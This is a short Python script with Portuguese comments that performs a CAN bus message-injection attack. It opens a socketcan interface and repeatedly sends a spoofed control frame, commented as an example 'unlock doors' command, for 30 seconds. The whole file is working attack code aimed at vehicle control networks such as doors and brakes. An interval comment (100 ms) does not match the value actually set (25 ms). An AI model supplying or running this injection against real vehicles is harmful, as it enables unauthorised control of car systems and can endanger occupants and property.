import can
import time

# --- Parâmetros do Ataque de Injeção ---

CAN_INTERFACE = 'can0'

# IDs de mensagens válidas de controle (exemplo: ID de controle de portas, freios, etc.)
INJECTION_ID = 0x123  # Esse ID precisa ser realista para o alvo
INJECTION_DATA = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]  # Exemplo: comando de "destravar portas"

# Intervalo entre mensagens injetadas (em segundos)
INJECTION_INTERVAL = 0.025  # Envia uma mensagem a cada 100ms

# Duração do ataque
ATTACK_DURATION_SECONDS = 30

# --- Lógica do Ataque de Injeção ---

def run_injection_attack():
    print("Iniciando o ataque de injeção de mensagens CAN...")
    print(f"Interface: {CAN_INTERFACE}")
    print(f"ID da Mensagem Injetada: {hex(INJECTION_ID)}")
    print(f"Duração: {ATTACK_DURATION_SECONDS} segundos")
    
    bus = None
    try:
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')

        # Criação da mensagem falsa
        msg = can.Message(
            arbitration_id=INJECTION_ID,
            data=INJECTION_DATA,
            is_extended_id=False
        )

        start_time = time.time()
        message_count = 0

        while time.time() - start_time < ATTACK_DURATION_SECONDS:
            bus.send(msg)
            message_count += 1
            time.sleep(INJECTION_INTERVAL)

        print("\n--- Ataque de Injeção Finalizado ---")
        print(f"Mensagens injetadas: {message_count}")

    except Exception as e:
        print(f"Ocorreu um erro: {e}")
        print("Verifique se a interface CAN está ativa com 'sudo ip link set can0 up'.")

    finally:
        if bus:
            bus.shutdown()
            print("Conexão com o barramento CAN encerrada.")

if __name__ == "__main__":
    run_injection_attack()
